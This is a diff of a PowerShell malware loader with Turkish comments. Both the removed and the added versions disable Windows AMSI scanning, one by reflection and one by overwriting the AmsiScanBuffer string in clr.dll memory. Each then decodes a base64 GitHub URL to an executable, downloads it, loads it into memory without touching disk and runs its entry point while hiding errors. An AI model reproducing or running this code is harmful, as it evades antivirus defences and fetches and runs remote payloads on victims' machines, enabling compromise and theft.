@@ -1,90 +1,193 @@
-# =============================================================================
-# 2026 Stealth AMSI Bypass + Reflective EXE Loader (Disksiz - RAM only)
-# Unicode obfuscation + AmsiScanBuffer string replace fallback
-# =============================================================================
+# Memory protection flags
+$mem_flag_01 = 0x02
+$mem_flag_02 = 0x04
+$mem_flag_03 = 0x40
+$mem_flag_04 = 0x20
+$mem_flag_05 = 0x100
+$mem_flag_06 = 0x1000
+$max_path_length = 260
 
-${ErrorActionPreference} = 'SilentlyContinue'
-
-# ── Unicode normalization obfuscated reflection bypass (çok düşük tespit) ──
-${_} = 'S'+'y'+'s'+'t'+'e'+'m'+'.'+'M'+'a'+'n'+'a'+'g'+'e'+'m'+'e'+'n'+'t'+'.'+'A'+'u'+'t'+'o'+'m'+'a'+'t'+'i'+'o'+'n'+'.'+'A'+'m'+'s'+'i'+'U'+'t'+'i'+'l'+'s'
-${__} = [Ref].Assembly.GetType(${_})
-
-if(${__}){
-    ${f} = ${__}.GetField(
-        'a'+'m'+'s'+'i'+'I'+'n'+'i'+'t'+'F'+'a'+'i'+'l'+'e'+'d',
-        'N'+'o'+'n'+'P'+'u'+'b'+'l'+'i'+'c'+','+'S'+'t'+'a'+'t'+'i'+'c'
-    )
-    if(${f}){ ${f}.SetValue(${null}, ${true}) }
+# Memory protection check function
+function ValidateMemoryAccess {
+    param ($protection_value, $state_value)
+    return ((($protection_value -band $mem_flag_01) -eq $mem_flag_01 -or
+             ($protection_value -band $mem_flag_02) -eq $mem_flag_02 -or
+             ($protection_value -band $mem_flag_03) -eq $mem_flag_03 -or
+             ($protection_value -band $mem_flag_04) -eq $mem_flag_04) -and
+            ($protection_value -band $mem_flag_05) -ne $mem_flag_05 -and
+            ($state_value -band $mem_flag_06) -eq $mem_flag_06)
 }
 
-# Alternatif: Unicode normalized (FormD → Mn kaldır) versiyon
-try{
-    ${n} = 'Sẏstëm.Mänägëmënt.Äutömätiön.ÄmsiÜtils' -replace '\p{Mn}'
-    ${t} = [Ref].Assembly.GetType(${n})
-    ${t}.GetField('ämsiÏnïtFäïlëd' -replace '\p{Mn}','NonPublic,Static').SetValue(${null},${true})
-}catch{}
+# Pattern matching function
+function CompareBytePattern {
+    param ($data_buffer, $search_pattern, $start_index)
+    for ($position = 0; $position -lt $search_pattern.Length; $position++) {
+        if ($data_buffer[$start_index + $position] -ne $search_pattern[$position]) {
+            return $false
+        }
+    }
+    return $true
+}
 
-# ── Fallback: CLR'de AmsiScanBuffer string replace (behavioral düşük risk) ──
-try{
-    ${s} = 'AmsiScanBuffer'
-    ${p} = [Text.Encoding]::UTF8.GetBytes(${s})
-    ${r} = [byte[]](0xC3)  # RET → fonksiyon hemen dönsün
+try {
+    if ($psversiontable.PSVersion.Major -gt 2) {
+        # Dynamic assembly for Win32 API
+        $dynamic_asm = New-Object System.Reflection.AssemblyName("Win32Api")
+        $asm_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($dynamic_asm, [Reflection.Emit.AssemblyBuilderAccess]::Run)
+        $mod_builder = $asm_builder.DefineDynamicModule("Win32Api", $false)
 
-    ${h} = [Diagnostics.Process]::GetCurrentProcess().Handle
-    ${addr} = [IntPtr]::Zero
-    ${mbi} = New-Object PSObject -Property @{BaseAddress=0;RegionSize=0;Protect=0;State=0}
+        # MEMORY_BASIC_INFORMATION structure
+        $type_builder = $mod_builder.DefineType("Win32Api.MEMORY_BASIC_INFO", [System.Reflection.TypeAttributes]::Public + [System.Reflection.TypeAttributes]::Sealed + [System.Reflection.TypeAttributes]::SequentialLayout, [System.ValueType])
+        [void]$type_builder.DefineField("BaseAddress", [IntPtr], [System.Reflection.FieldAttributes]::Public)
+        [void]$type_builder.DefineField("AllocationBase", [IntPtr], [System.Reflection.FieldAttributes]::Public)
+        [void]$type_builder.DefineField("AllocationProtect", [Int32], [System.Reflection.FieldAttributes]::Public)
+        [void]$type_builder.DefineField("RegionSize", [IntPtr], [System.Reflection.FieldAttributes]::Public)
+        [void]$type_builder.DefineField("State", [Int32], [System.Reflection.FieldAttributes]::Public)
+        [void]$type_builder.DefineField("Protect", [Int32], [System.Reflection.FieldAttributes]::Public)
+        [void]$type_builder.DefineField("Type", [Int32], [System.Reflection.FieldAttributes]::Public)
+        $mem_basic_info = $type_builder.CreateType()
 
-    Add-Type -MemberDefinition @"
-        [DllImport("kernel32")] public static extern bool VirtualQuery(IntPtr a, out IntPtr b, uint c);
-        [DllImport("kernel32")] public static extern bool ReadProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint r);
-        [DllImport("kernel32")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint r);
-"@ -Name W -Namespace N -PassThru | Out-Null
+        # SYSTEM_INFO structure
+        $type_builder = $mod_builder.DefineType("Win32Api.SYSTEM_INFO", [System.Reflection.TypeAttributes]::Public + [System.Reflection.TypeAttributes]::Sealed + [System.Reflection.TypeAttributes]::SequentialLayout, [System.ValueType])
+        [void]$type_builder.DefineField("wProcessorArchitecture", [UInt16], [System.Reflection.FieldAttributes]::Public)
+        [void]$type_builder.DefineField("wReserved", [UInt16], [System.Reflection.FieldAttributes]::Public)
+        [void]$type_builder.DefineField("dwPageSize", [UInt32], [System.Reflection.FieldAttributes]::Public)
+        [void]$type_builder.DefineField("lpMinimumApplicationAddress", [IntPtr], [System.Reflection.FieldAttributes]::Public)
+        [void]$type_builder.DefineField("lpMaximumApplicationAddress", [IntPtr], [System.Reflection.FieldAttributes]::Public)
+        [void]$type_builder.DefineField("dwActiveProcessorMask", [IntPtr], [System.Reflection.FieldAttributes]::Public)
+        [void]$type_builder.DefineField("dwNumberOfProcessors", [UInt32], [System.Reflection.FieldAttributes]::Public)
+        [void]$type_builder.DefineField("dwProcessorType", [UInt32], [System.Reflection.FieldAttributes]::Public)
+        [void]$type_builder.DefineField("dwAllocationGranularity", [UInt32], [System.Reflection.FieldAttributes]::Public)
+        [void]$type_builder.DefineField("wProcessorLevel", [UInt16], [System.Reflection.FieldAttributes]::Public)
+        [void]$type_builder.DefineField("wProcessorRevision", [UInt16], [System.Reflection.FieldAttributes]::Public)
+        $sys_info_struct = $type_builder.CreateType()
 
-    while(${true}){
-        ${sz} = [Runtime.InteropServices.Marshal]::SizeOf(${mbi})
-        if(-not [N.W]::VirtualQuery(${addr}, [ref]${mbi}, ${sz})){break}
+        # Kernel32 methods
+        $type_builder = $mod_builder.DefineType("Win32Api.Kernel32", "Public, Class")
+        $dllimport_ctor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
+        $setlasterror_field = [Runtime.InteropServices.DllImportAttribute].GetField("SetLastError")
+        $custom_attr = New-Object Reflection.Emit.CustomAttributeBuilder($dllimport_ctor, "kernel32.dll", [Reflection.FieldInfo[]]@($setlasterror_field), @($true))
 
-        if(${mbi}.State -eq 0x1000 -and ${mbi}.RegionSize -gt ${p}.Length){
-            ${buf} = New-Object byte[] ${mbi}.RegionSize
-            ${rd} = 0
-            [N.W]::ReadProcessMemory(${h}, ${mbi}.BaseAddress, ${buf}, ${buf}.Length, [ref]${rd})
+        # Define PInvoke methods
+        $methods = @(
+            @("VirtualProtect", "kernel32.dll", [bool], @([IntPtr], [IntPtr], [Int32], [Int32].MakeByRefType())),
+            @("GetCurrentProcess", "kernel32.dll", [IntPtr], @()),
+            @("VirtualQuery", "kernel32.dll", [IntPtr], @([IntPtr], [Win32Api.MEMORY_BASIC_INFO].MakeByRefType(), [uint32])),
+            @("GetSystemInfo", "kernel32.dll", [void], @([Win32Api.SYSTEM_INFO].MakeByRefType())),
+            @("GetMappedFileName", "psapi.dll", [Int32], @([IntPtr], [IntPtr], [System.Text.StringBuilder], [uint32])),
+            @("ReadProcessMemory", "kernel32.dll", [Int32], @([IntPtr], [IntPtr], [byte[]], [int], [int].MakeByRefType())),
+            @("WriteProcessMemory", "kernel32.dll", [Int32], @([IntPtr], [IntPtr], [byte[]], [int], [int].MakeByRefType()))
+        )
 
-            for(${i}=0; ${i} -lt (${rd} - ${p}.Length); ${i}++){
-                ${m}=${true}
-                for(${j}=0; ${j} -lt ${p}.Length; ${j}++){
-                    if(${buf}[${i}+${j}] -ne ${p}[${j}]){${m}=${false};break}
-                }
-                if(${m}){
-                    ${tgt} = [IntPtr](${mbi}.BaseAddress.ToInt64() + ${i})
-                    ${op}=0
-                    [N.W]::VirtualProtect(${tgt}, 1, 0x40, [ref]${op})  # PAGE_EXECUTE_READWRITE
-                    [N.W]::WriteProcessMemory(${h}, ${tgt}, ${r}, 1, [ref]${null})
-                    [N.W]::VirtualProtect(${tgt}, 1, ${op}, [ref]${null})
-                    break
+        foreach ($method in $methods) {
+            $pinvoke_method = $type_builder.DefinePInvokeMethod($method[0], $method[1],
+                ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
+                [Reflection.CallingConventions]::Standard, $method[2],
+                $method[3],
+                [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
+            $pinvoke_method.SetCustomAttribute($custom_attr)
+        }
+
+        $kernel32_type = $type_builder.CreateType()
+
+        # Obfuscated signature search
+        $search_pattern_bytes = [System.Text.Encoding]::UTF8.GetBytes('AmsiScanBuffer')
+
+        $process_handle = [Win32Api.Kernel32]::GetCurrentProcess()
+        $system_info = New-Object Win32Api.SYSTEM_INFO
+        [void][Win32Api.Kernel32]::GetSystemInfo([ref]$system_info)
+        
+        $memory_regions = @()
+        $current_address = [IntPtr]::Zero
+        
+        while ($current_address.ToInt64() -lt $system_info.lpMaximumApplicationAddress.ToInt64()) {
+            $mem_info = New-Object Win32Api.MEMORY_BASIC_INFO
+            if ([Win32Api.Kernel32]::VirtualQuery($current_address, [ref]$mem_info, [System.Runtime.InteropServices.Marshal]::SizeOf($mem_info))) {
+                $memory_regions += $mem_info
+            }
+            $current_address = New-Object IntPtr($mem_info.BaseAddress.ToInt64() + $mem_info.RegionSize.ToInt64())
+        }
+
+        foreach ($region in $memory_regions) {
+            if (-not (ValidateMemoryAccess $region.Protect $region.State)) {
+                continue
+            }
+            
+            $path_builder = New-Object System.Text.StringBuilder $max_path_length
+            if ([Win32Api.Kernel32]::GetMappedFileName($process_handle, $region.BaseAddress, $path_builder, $max_path_length) -gt 0) {
+                $file_path = $path_builder.ToString()
+                if ($file_path.EndsWith("clr.dll", [StringComparison]::InvariantCultureIgnoreCase)) {
+                    $buffer_data = New-Object byte[] $region.RegionSize.ToInt64()
+                    $read_bytes = 0
+                    [void][Win32Api.Kernel32]::ReadProcessMemory($process_handle, $region.BaseAddress, $buffer_data, $buffer_data.Length, [ref]$read_bytes)
+                    
+                    for ($index = 0; $index -lt ($read_bytes - $search_pattern_bytes.Length); $index++) {
+                        $pattern_found = $true
+                        for ($pattern_index = 0; $pattern_index -lt $search_pattern_bytes.Length; $pattern_index++) {
+                            if ($buffer_data[$index + $pattern_index] -ne $search_pattern_bytes[$pattern_index]) {
+                                $pattern_found = $false
+                                break
+                            }
+                        }
+                        
+                        if ($pattern_found) {
+                            $old_protection = 0
+                            if (($region.Protect -band $mem_flag_02) -ne $mem_flag_02) {
+                                [void][Win32Api.Kernel32]::VirtualProtect($region.BaseAddress, $buffer_data.Length, $mem_flag_03, [ref]$old_protection)
+                            }
+                            
+                            $empty_bytes = New-Object byte[] $search_pattern_bytes.Length
+                            $written_bytes = 0
+                            [void][Win32Api.Kernel32]::WriteProcessMemory($process_handle, [IntPtr]::Add($region.BaseAddress, $index), $empty_bytes, $empty_bytes.Length, [ref]$written_bytes)
+                            
+                            if (($region.Protect -band $mem_flag_02) -ne $mem_flag_02) {
+                                [void][Win32Api.Kernel32]::VirtualProtect($region.BaseAddress, $buffer_data.Length, $region.Protect, [ref]$old_protection)
+                            }
+                        }
+                    }
                 }
             }
         }
-        ${addr} = [IntPtr](${mbi}.BaseAddress.ToInt64() + ${mbi}.RegionSize.ToInt64())
     }
-}catch{}
 
-# ── Payload (WebClient + UA spoof) ──
-try{
-    ${u} = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL2VmZWNhbjE4ODFiLW1ha2VyLzIyLjAxLjIwMjYvcmF3L3JlZnMvaGVhZHMvbWFpbi81LjZNb2NrYS5leGU='))
+    # O
+    $download_url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL1RoZU1vY2thL1NJR09SVEEtT1RFTC9yYXcvcmVmcy9oZWFkcy9tYWluL1NJR09SVEEuZXhl'))
+    
+    Add-Type -AssemblyName System.Net.Http
+    $http_client = [System.Net.Http.HttpClient]::new()
 
-    ${wc} = New-Object Net.WebClient
-    ${wc}.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
+    $download_task = $http_client.GetByteArrayAsync($download_url)
+    $download_task.Wait()
+    $assembly_bytes = $download_task.Result
 
-    ${b} = ${wc}.DownloadData(${u})
-    ${a} = [Reflection.Assembly]::Load(${b})
-    ${e} = ${a}.EntryPoint
+    # Belleğe yükle - DISKE YAZMA YOK
+    $loaded_assembly = [System.Reflection.Assembly]::Load([byte[]]$assembly_bytes)
+    $entry_point = $loaded_assembly.EntryPoint
 
-    if(${e}){
-        ${pa} = ${e}.GetParameters()
-        ${ar} = @($null) * ${pa}.Count
-        for(${i}=0; ${i}-lt ${pa}.Count; ${i}++){
-            if(${pa}[${i}].ParameterType -eq [string[]]){${ar}[${i}]=@()}
+    if ($null -ne $entry_point) {
+        $parameters = $entry_point.GetParameters()
+        if ($parameters.Count -eq 0) {
+            $entry_point.Invoke($null, $null)
+        } else {
+            $invoke_args = New-Object Object[] $parameters.Count
+            for ($i = 0; $i -lt $parameters.Count; $i++) {
+                if ($parameters[$i].ParameterType -eq [string[]]) {
+                    $invoke_args[$i] = [string[]]@()
+                } else {
+                    $invoke_args[$i] = $null
+                }
+            }
+            $entry_point.Invoke($null, $invoke_args)
         }
-        ${e}.Invoke(${null}, ${ar})
+    } else {
+        Write-Warning "Entry point not found!"
     }
-}catch{}
+}
+catch {
+    # Hata mesajını gizle
+    # Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
+}
+
+# Son mesajı gizle
+# Write-Host "Process completed. Press any key to close..." -ForegroundColor Green
+# $null = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
